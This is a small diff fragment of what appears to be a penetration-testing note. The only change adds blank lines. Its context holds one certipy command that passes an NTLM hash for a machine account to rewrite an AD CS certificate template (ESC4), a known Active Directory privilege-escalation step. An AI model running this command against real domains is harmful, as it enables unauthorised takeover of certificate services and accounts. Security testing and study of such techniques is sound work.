@@ -15,3 +15,5 @@ updated_at: '2023-04-10T20:25:59.025048+00:00'
 ```bash
 certipy template 'corp.local/johnpc$@ca.corp.local' -hashes :fc525c9683e8fe067095ba2ddc971889 -template 'ESC4' -configuration ESC4.json
 ```
+
+
